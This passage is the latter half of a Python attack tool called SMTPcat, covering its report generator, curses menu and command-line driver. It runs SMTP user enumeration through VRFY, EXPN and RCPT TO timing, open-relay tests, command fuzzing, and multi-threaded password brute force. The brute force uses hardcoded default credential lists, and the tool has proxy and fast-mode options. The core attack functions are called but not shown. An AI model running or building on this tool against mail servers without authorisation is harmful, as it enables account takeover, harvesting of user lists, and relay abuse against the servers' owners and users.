        if not timing_data or all(not v for v in timing_data.values()):
            print(f"[-] No data to plot for {title}")
            return
        
        valid_labels = [k for k, v in timing_data.items() if v]
        valid_values = [v for v in timing_data.values() if v]
        
        if not valid_labels:
            return
        
        fig, ax = plt.subplots(figsize=(12, 7))
        bp = ax.boxplot(valid_values, labels=valid_labels, patch_artist=True)
        
        colors = ['#4daf4a', '#e41a1c', '#377eb8', '#ff7f00']
        for patch, color in zip(bp['boxes'], colors[:len(valid_labels)]):
            patch.set_facecolor(color)
        
        ax.set_title(title, fontsize=16)
        ax.set_ylabel("Response Time (seconds)", fontsize=12)
        ax.grid(True, linestyle='--', alpha=0.6)
        
        plt.tight_layout()
        try:
            plt.savefig(filename)
            print(f"[+] Plot saved: {filename}")
            logging.info(f"Plot saved: {filename}")
        except Exception as e:
            print(f"[-] Plot save error: {e}")
        finally:
            plt.close(fig)
else:
    def plot_timing_data(*args, **kwargs):
        print("[-] matplotlib not installed. Skipping plots.")


# ============================================================================
# REPORT GENERATION
# ============================================================================

@dataclass
class ScanResult:
    target: str
    port: int = 25
    banner: Optional[str] = None
    starttls: bool = False
    extensions: List[str] = field(default_factory=list)
    valid_users_vrfy: List[str] = field(default_factory=list)
    valid_users_rcpt: List[str] = field(default_factory=list)
    expn_results: Dict[str, str] = field(default_factory=dict)
    open_relay: bool = False
    injection_findings: List[Dict] = field(default_factory=list)
    successful_logins: List[Tuple[str, str]] = field(default_factory=list)
    cves: List[Dict] = field(default_factory=list)
    cloud_provider: Optional[str] = None
    mta_sts: Optional[Dict] = None
    dane: Optional[Dict] = None
    nmap_output: Optional[str] = None
    timing_data: Dict[str, Dict] = field(default_factory=dict)
    scan_time: str = field(default_factory=lambda: datetime.now().isoformat())

def generate_html_report(result: ScanResult) -> str:
    """Generate comprehensive HTML report."""
    filename = f"smtpcat_report_{result.target.replace('.', '_')}_{int(time.time())}.html"
    
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMTPcat Report - {result.target}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0e17; color: #c8d6e5; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: #111927; border-radius: 12px; padding: 40px; border: 1px solid #1a2744; }}
        h1 {{ color: #00d4ff; font-size: 2.2em; border-bottom: 2px solid #00d4ff33; padding-bottom: 15px; margin-bottom: 30px; }}
        h2 {{ color: #00d4ff; margin: 25px 0 15px 0; padding-bottom: 8px; border-bottom: 1px solid #1a2744; }}
        .section {{ background: #0d1421; border-radius: 8px; padding: 20px; margin: 15px 0; border: 1px solid #1a2744; }}
        .critical {{ color: #ff4757; font-weight: bold; }}
        .success {{ color: #2ed573; font-weight: bold; }}
        .warning {{ color: #ffa502; font-weight: bold; }}
        .info {{ color: #00d4ff; }}
        ul {{ list-style: none; padding: 0; }}
        ul li {{ padding: 8px 12px; margin: 4px 0; background: #0d1421; border-radius: 4px; border-left: 3px solid #00d4ff33; }}
        pre {{ background: #0a0e17; padding: 15px; border-radius: 6px; overflow-x: auto; font-size: 0.85em; border: 1px solid #1a2744; }}
        .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 0.75em; font-weight: bold; }}
        .badge-critical {{ background: #ff475733; color: #ff4757; }}
        .badge-success {{ background: #2ed57333; color: #2ed573; }}
        .badge-warning {{ background: #ffa50233; color: #ffa502; }}
        .grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }}
        @media (max-width: 768px) {{ .grid {{ grid-template-columns: 1fr; }} }}
        .footer {{ text-align: center; margin-top: 40px; padding-top: 20px; border-top: 1px solid #1a2744; color: #666; font-size: 0.85em; }}
    </style>
</head>
<body>
<div class="container">
    <h1>SMTPcat — Security Assessment Report</h1>
    <p><strong>Target:</strong> {result.target}:{result.port}</p>
    <p><strong>Scan Date:</strong> {result.scan_time}</p>
    <p><strong>Author:</strong> Anonymous-beta</p>

    <div class="section">
        <h2>🔍 Service Discovery</h2>
        <p><strong>Banner:</strong> <code>{result.banner or 'N/A'}</code></p>
        <p><strong>STARTTLS:</strong> <span class="{'success' if result.starttls else 'warning'}">{'Supported' if result.starttls else 'Not Supported'}</span></p>
        <p><strong>ESMTP Extensions:</strong> {', '.join(result.extensions) or 'None'}</p>
        <p><strong>Cloud Provider:</strong> {result.cloud_provider or 'Not identified'}</p>
    </div>

    <div class="section">
        <h2>👤 User Enumeration</h2>
        <div class="grid">
            <div>
                <h3>VRFY Valid</h3>
                <ul>{''.join(f'<li>{u}</li>' for u in result.valid_users_vrfy) or '<li>None</li>'}</ul>
            </div>
            <div>
                <h3>RCPT TO Valid</h3>
                <ul>{''.join(f'<li>{u}</li>' for u in result.valid_users_rcpt) or '<li>None</li>'}</ul>
            </div>
        </div>
        <h3>EXPN Results</h3>
        <pre>{json.dumps(result.expn_results, indent=2) if result.expn_results else 'None'}</pre>
    </div>

    <div class="section">
        <h2>🚨 Vulnerabilities</h2>
        <p><strong>Open Relay:</strong> <span class="{'critical' if result.open_relay else 'success'}">{'VULNERABLE' if result.open_relay else 'Not Vulnerable'}</span></p>
        <p><strong>Injection Findings:</strong> {len(result.injection_findings)}</p>
        <ul>
        {''.join(f'<li><span class="badge badge-{f.get("type", "warning")}">{f.get("type", "unknown")}</span> {f.get("command", "N/A")} — {f.get("payload", "")[:80]}...</li>' for f in result.injection_findings[:20])}
        </ul>
        <h3>Matched CVEs</h3>
        <ul>
        {''.join(f'<li><span class="badge badge-{c.get("impact", "warning").lower()}">{c.get("impact", "Unknown")}</span> <strong>{c.get("id", "N/A")}</strong> — {c.get("desc", "")}<br><span style="font-size:0.85em;color:#888;">→ {c.get("remediation", "")}</span></li>' for c in result.cves) or '<li>None matched</li>'}
        </ul>
    </div>

    <div class="section">
        <h2>🔑 Authentication</h2>
        <p><strong>Successful Logins:</strong> {len(result.successful_logins)}</p>
        <ul>
        {''.join(f'<li><span class="critical">{u}:{p}</span></li>' for u, p in result.successful_logins) or '<li>None</li>'}
        </ul>
    </div>

    <div class="section">
        <h2>🔒 Modern Protocol Compliance</h2>
        <h3>MTA-STS</h3>
        <pre>{json.dumps(result.mta_sts, indent=2) if result.mta_sts else 'Not checked'}</pre>
        <h3>DANE (TLSA)</h3>
        <pre>{json.dumps(result.dane, indent=2) if result.dane else 'Not checked'}</pre>
    </div>

    {f'''<div class="section"><h2>📡 Nmap Output</h2><pre>{result.nmap_output[:2000]}</pre></div>''' if result.nmap_output else ''}

    <div class="section">
        <h2>📊 Timing Analysis</h2>
        {''.join(f'<p><strong>{k}:</strong> {len(v)} samples</p>' for k, v in result.timing_data.items() if v)}
        <p style="color:#666;font-size:0.85em;">See generated PNG plots in the same directory.</p>
    </div>

    <div class="section">
        <h2>🛡️ Remediation Summary</h2>
        <ul>
            <li>Disable VRFY/EXPN or require authentication</li>
            <li>Implement rate limiting on RCPT TO and AUTH</li>
            <li>Enforce STARTTLS with strong ciphers</li>
            <li>Configure strict relay policies (no open relay)</li>
            <li>Regular patching and configuration audits</li>
            <li>Implement MTA-STS and DANE for domain protection</li>
            <li>Deploy DMARC, DKIM, SPF</li>
            <li>Enable verbose logging and alerting</li>
        </ul>
    </div>

    <div class="footer">
        <p>SMTPcat v2.0 — Anonymous-beta</p>
        <p style="font-size:0.75em;">Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
</div>
</body>
</html>'''
    
    with open(filename, 'w') as f:
        f.write(html)
    
    print(f"[+] Report saved: {filename}")
    logging.info(f"Report generated: {filename}")
    return filename


# ============================================================================
# TUI INTERFACE
# ============================================================================

class SMTPcatTUI:
    """Curses-based TUI for SMTPcat."""
    
    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.target = ""
        self.port = 25
        self.running = True
        self.status = "Ready"
        self.results = ScanResult(target="")
        self.scan_thread = None
        
        curses.curs_set(0)
        curses.start_color()
        curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
        curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.init_pair(5, curses.COLOR_WHITE, curses.COLOR_BLUE)
        curses.init_pair(6, curses.COLOR_WHITE, curses.COLOR_BLACK)
    
    def draw_header(self):
        h, w = self.stdscr.getmaxyx()
        ascii_banner = [
            "███████╗███╗   ███╗████████╗██████╗  ██████╗ █████╗ ████████╗",
            "██╔════╝████╗ ████║╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝",
            "███████╗██╔████╔██║   ██║   ██████╔╝██║     ███████║   ██║   ",
            "╚════██║██║╚██╔╝██║   ██║   ██╔═══╝ ██║     ██╔══██║   ██║   ",
            "███████║██║ ╚═╝ ██║   ██║   ██║     ╚██████╗██║  ██║   ██║   ",
            "╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝   "
        ]
        for i, line in enumerate(ascii_banner):
            if i < h - 2:
                self.stdscr.addstr(i, (w - len(line)) // 2, line, curses.color_pair(4))
        self.stdscr.addstr(7, (w - 28) // 2, "Advanced SMTP Security Tool", curses.color_pair(4))
        self.stdscr.addstr(8, (w - 22) // 2, "— Anonymous-beta —", curses.color_pair(6))
    
    def draw_menu(self):
        self.stdscr.clear()
        h, w = self.stdscr.getmaxyx()
        
        self.draw_header()
        
        y = 11
        self.stdscr.addstr(y, 2, f"Target: {self.target or '(not set)'}", curses.color_pair(6))
        self.stdscr.addstr(y, 40, f"Port: {self.port}")
        self.stdscr.addstr(y + 1, 2, f"Status: {self.status}", curses.color_pair(3))
        
        y += 3
        menu_items = [
            ("1", "Set Target", "Configure target host/IP"),
            ("2", "Banner Grab", "Get SMTP banner"),
            ("3", "STARTTLS Check", "Check extensions & TLS"),
            ("4", "VRFY Enum", "VRFY-based user enumeration"),
            ("5", "RCPT TO Enum", "RCPT TO with timing analysis"),
            ("6", "EXPN Enum", "Mailing list enumeration"),
            ("7", "Open Relay", "Test for open relay"),
            ("8", "Fuzzing", "SMTP command fuzzing"),
            ("9", "Brute Force", "Authentication brute force"),
            ("A", "Full Scan", "Run all tests"),
            ("B", "Report", "Generate HTML report"),
            ("C", "Nmap", "Run Nmap scripts"),
            ("q", "Quit", "Exit SMTPcat")
        ]
        
        for i, (key, label, desc) in enumerate(menu_items):
            self.stdscr.addstr(y + i, 4, f"[{key}]", curses.color_pair(5))
            self.stdscr.addstr(y + i, 10, label, curses.color_pair(6))
            self.stdscr.addstr(y + i, 30, desc, curses.color_pair(4))
        
        self.stdscr.addstr(h - 2, 2, "Press key to select", curses.color_pair(6))
        self.stdscr.refresh()
    
    def set_target(self):
        curses.echo()
        self.stdscr.addstr(12, 20, "Enter target (hostname/IP): ")
        self.target = self.stdscr.getstr(12, 48, 50).decode().strip()
        curses.noecho()
        self.results.target = self.target
    
    def run_scan(self, scan_func, *args, **kwargs):
        self.status = "Running..."
        self.draw_menu()
        try:
            result = scan_func(self.target, *args, **kwargs)
            self.status = "Complete"
            return result
        except Exception as e:
            self.status = f"Error: {str(e)[:40]}"
            logging.error(f"Scan error: {e}")
            return None
    
    def run_full_scan(self):
        self.status = "Full scan in progress..."
        self.draw_menu()
        
        try:
            self.results.banner = grab_banner(self.target, self.port)
            self.results.starttls, self.results.extensions = check_starttls(self.target, self.port)
            self.results.valid_users_vrfy = enum_vrfy(self.target, ["admin","root","test","postmaster","info","support","webmaster"], self.port)
            self.results.valid_users_rcpt, timing1 = enum_rcpt(self.target, ["admin","root","test","info"], [self.target], attempts=2)
            self.results.timing_data['rcpt'] = timing1
            self.results.open_relay = check_open_relay(self.target, self.port)
            self.results.injection_findings = fuzz_smtp(self.target, self.port)
            self.results.cloud_provider = identify_cloud(self.target) if NETWORK_EXTRAS else None
            self.results.cves = match_cves(self.results.banner, self.results.extensions, self.results.open_relay, self.results.injection_findings)
            
            if NETWORK_EXTRAS:
                self.results.mta_sts = check_mta_sts(self.target)
                self.results.dane = check_dane(self.target, self.port)
            
            self.status = "Full scan complete"
        except Exception as e:
            self.status = f"Full scan error: {str(e)[:40]}"
            logging.error(f"Full scan error: {e}")
    
    def run(self):
        while self.running:
            self.draw_menu()
            key = self.stdscr.getch()
            
            if key == ord('q'):
                self.running = False
            elif key == ord('1'):
                self.set_target()
            elif key == ord('2') and self.target:
                self.results.banner = self.run_scan(grab_banner, self.port)
            elif key == ord('3') and self.target:
                self.results.starttls, self.results.extensions = self.run_scan(check_starttls, self.port) or (False, [])
            elif key == ord('4') and self.target:
                users = ["admin", "root", "test", "postmaster", "info", "support", "webmaster", "sales", "hr"]
                self.results.valid_users_vrfy = self.run_scan(enum_vrfy, users, self.port) or []
            elif key == ord('5') and self.target:
                users = ["admin", "root", "test", "info", "support", "webmaster"]
                valid, timing = self.run_scan(enum_rcpt, users, [self.target], attempts=3) or ([], {})
                self.results.valid_users_rcpt = valid
                self.results.timing_data['rcpt'] = timing
            elif key == ord('6') and self.target:
                lists = ["staff", "admin", "support", "postmaster", "noreply", "info", "all", "sales"]
                self.results.expn_results = self.run_scan(enum_expn, lists, self.port) or {}
            elif key == ord('7') and self.target:
                self.results.open_relay = self.run_scan(check_open_relay, self.port) or False
            elif key == ord('8') and self.target:
                self.results.injection_findings = self.run_scan(fuzz_smtp, self.port) or []
            elif key == ord('9') and self.target:
                users = ["admin", "root", "test", "postmaster", "info"]
                passwords = ["password", "123456", "admin", "test", "welcome", "changeit", "P@ssw0rd"]
                logins, timing = self.run_scan(brute_force, self.port, users, passwords, False, 3) or ([], {})
                self.results.successful_logins = logins
                self.results.timing_data['bruteforce'] = timing
            elif key == ord('a') or key == ord('A'):
                if self.target:
                    self.run_full_scan()
            elif key == ord('b') or key == ord('B'):
                if self.results.target:
                    report = generate_html_report(self.results)
                    self.status = f"Report: {os.path.basename(report)}"
            elif key == ord('c') or key == ord('C'):
                if self.target:
                    self.results.nmap_output = self.run_scan(run_nmap, self.port)


# ============================================================================
# MAIN
# ============================================================================

def main_tui():
    """Launch TUI interface."""
    curses.wrapper(SMTPcatTUI)

def main_cli():
    """CLI interface with full argument support."""
    parser = argparse.ArgumentParser(
        description="SMTPcat — Advanced SMTP Security Assessment Tool",
        epilog="Author: Anonymous-beta"
    )
    parser.add_argument("target", help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=25, help="SMTP port (default: 25)")
    parser.add_argument("--tui", action="store_true", help="Launch TUI interface")
    parser.add_argument("--full", action="store_true", help="Run full aggressive scan")
    parser.add_argument("--quick", action="store_true", help="Quick scan (banner, STARTTLS)")
    parser.add_argument("--users", help="File with usernames (one per line)")
    parser.add_argument("--passwords", help="File with passwords (one per line)")
    parser.add_argument("--domains", help="Comma-separated domains for RCPT TO")
    parser.add_argument("--from", dest="from_emails", help="Comma-separated FROM emails")
    parser.add_argument("--to", dest="to_emails", help="Comma-separated TO emails")
    parser.add_argument("--expn", default="staff,admin,support,postmaster,info", help="EXPN list names")
    parser.add_argument("--tls", action="store_true", help="Force TLS/STARTTLS")
    parser.add_argument("--nmap", action="store_true", help="Run Nmap scripts")
    parser.add_argument("--workers", type=int, default=10, help="Concurrent workers (default: 10)")
    parser.add_argument("--fast", action="store_true", help="Fast mode (aggressive delays)")
    parser.add_argument("--no-ai", action="store_true", help="Disable AI anomaly detection")
    parser.add_argument("--no-plot", action="store_true", help="Disable plotting")
    parser.add_argument("--proxy", help="Proxy (socks5://host:port or http://host:port)")
    
    args = parser.parse_args()
    
    # Apply settings
    global CURRENT_DELAY_MIN, CURRENT_DELAY_MAX, CURRENT_BURST, ML_AVAILABLE, PLOTTING_AVAILABLE
    if args.fast:
        CURRENT_DELAY_MIN = 0.05
        CURRENT_DELAY_MAX = 0.2
        CURRENT_BURST = 0.01
        print("[*] Fast mode enabled")
    if args.no_ai:
        ML_AVAILABLE = False
        print("[*] AI detection disabled")
    if args.no_plot:
        PLOTTING_AVAILABLE = False
        print("[*] Plotting disabled")
    
    if args.proxy:
        match = re.match(r"(socks5|http)://([\w\d\.-]+):(\d+)", args.proxy)
        if match and SOCKS_AVAILABLE:
            PROXY_SETTINGS['type'] = match.group(1)
            PROXY_SETTINGS['host'] = match.group(2)
            PROXY_SETTINGS['port'] = int(match.group(3))
            print(f"[+] Proxy: {PROXY_SETTINGS['type']}://{PROXY_SETTINGS['host']}:{PROXY_SETTINGS['port']}")
    
    if args.tui:
        main_tui()
        return
    
    # CLI Mode
    print("\n" + "="*70)
    print("SMTPcat — Advanced SMTP Security Assessment Tool")
    print("Author: Anonymous-beta")
    print("="*70 + "\n")
    
    result = ScanResult(target=args.target, port=args.port)
    print(f"[*] Target: {args.target}:{args.port}")
    
    # Load files
    users = ["admin", "root", "test", "postmaster", "info", "support", "webmaster", "sales", "hr"]
    if args.users:
        try:
            with open(args.users) as f:
                users = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(users)} users")
        except Exception as e:
            print(f"[-] Error loading users: {e}")
    
    passwords = ["password", "123456", "admin", "test", "welcome", "changeit", "P@ssw0rd", "user"]
    if args.passwords:
        try:
            with open(args.passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(passwords)} passwords")
        except Exception as e:
            print(f"[-] Error loading passwords: {e}")
    
    domains = [d.strip() for d in args.domains.split(',')] if args.domains else [args.target]
    from_emails = [e.strip() for e in args.from_emails.split(',')] if args.from_emails else None
    to_emails = [e.strip() for e in args.to_emails.split(',')] if args.to_emails else None
    
    # Step 1: Banner
    print("\n[+] Banner grabbing...")
    result.banner = grab_banner(args.target, args.port)
    if result.banner:
        print(f"    {result.banner[:100]}")
    
    # Step 2: STARTTLS
    print("\n[+] STARTTLS check...")
    result.starttls, result.extensions = check_starttls(args.target, args.port)
    print(f"    STARTTLS: {'YES' if result.starttls else 'NO'}")
    print(f"    Extensions: {', '.join(result.extensions) or 'None'}")
    
    if args.quick:
        print("\n[*] Quick scan complete.")
        generate_html_report(result)
        return
    
    # Step 3: User enumeration
    print("\n[+] VRFY enumeration...")
    result.valid_users_vrfy = enum_vrfy(args.target, users, args.port)
    if result.valid_users_vrfy:
        print(f"    Valid: {', '.join(result.valid_users_vrfy)}")
    
    print("\n[+] EXPN enumeration...")
    expn_lists = [l.strip() for l in args.expn.split(',')]
    result.expn_results = enum_expn(args.target, expn_lists, args.port)
    
    print("\n[+] RCPT TO enumeration...")
    valid_rcpt, rcpt_timing = enum_rcpt(args.target, users[:20], domains[:3], attempts=2)
    result.valid_users_rcpt = valid_rcpt
    result.timing_data['rcpt'] = rcpt_timing
    if valid_rcpt:
        print(f"    Valid: {', '.join(valid_rcpt)}")
    
    # Step 4: Open relay
    print("\n[+] Open relay check...")
    result.open_relay = check_open_relay(args.target, args.port, from_emails, to_emails)
    print(f"    Open relay: {'YES (VULNERABLE)' if result.open_relay else 'NO'}")
    
    # Step 5: Fuzzing
    print("\n[+] SMTP fuzzing...")
    result.injection_findings = fuzz_smtp(args.target, args.port)
    
    # Step 6: Brute force
    print("\n[+] Brute force...")
    logins, bf_timing = brute_force(args.target, args.port, users[:10], passwords[:10], args.tls, args.workers)
    result.successful_logins = logins
    result.timing_data['bruteforce'] = bf_timing
    
    # Step 7: Cloud detection
    if NETWORK_EXTRAS:
        print("\n[+] Cloud provider detection...")
        result.cloud_provider = identify_cloud(args.target)
        if result.cloud_provider:
            print(f"    Provider: {result.cloud_provider}")
        
        print("\n[+] MTA-STS check...")
        result.mta_sts = check_mta_sts(args.target)
        
        print("\n[+] DANE check...")
        result.dane = check_dane(args.target, args.port)
    
    # Step 8: CVE matching
    print("\n[+] CVE matching...")
    result.cves = match_cves(result.banner, result.extensions, result.open_relay, result.injection_findings)
    for cve in result.cves:
        print(f"    - {cve['id']}: {cve['desc'][:60]}...")
    
    # Step 9: Nmap
    if args.nmap:
        print("\n[+] Nmap scan...")
        result.nmap_output = run_nmap(args.target, args.port)
    
    # Step 10: Plots
    if PLOTTING_AVAILABLE and not args.no_plot:
        print("\n[+] Generating plots...")
        if result.timing_data.get('rcpt'):
            plot_timing_data(result.timing_data['rcpt'], "RCPT TO Response Times", "rcpt_timing.png")
        if result.timing_data.get('bruteforce'):
            plot_timing_data(result.timing_data['bruteforce'], "Brute Force Response Times", "bruteforce_timing.png")
    
    # Step 11: Report
    print("\n[+] Generating report...")
    report_file = generate_html_report(result)
    print(f"    Report: {report_file}")
    
    print("\n[*] Scan complete. Check smtpcat.log for details.")
    print("="*70)


if __name__ == "__main__":
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗███╗   ███╗████████╗██████╗  ██████╗ █████╗ ████████╗  ║
║   ██╔════╝████╗ ████║╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝  ║
║   ███████╗██╔████╔██║   ██║   ██████╔╝██║     ███████║   ██║     ║
║   ╚════██║██║╚██╔╝██║   ██║   ██╔═══╝ ██║     ██╔══██║   ██║     ║
║   ███████║██║ ╚═╝ ██║   ██║   ██║     ╚██████╗██║  ██║   ██║     ║
║   ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝     ║
║                                                                   ║
║           Advanced SMTP Security Assessment Tool                   ║
║                      Anonymous-beta                               ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        main_cli()
    else:
        print("Usage: python3 smtpcat.py <target> [options]")
        print("       python3 smtpcat.py --tui  (for TUI mode)")
        print("       python3 smtpcat.py -h     (for help)")
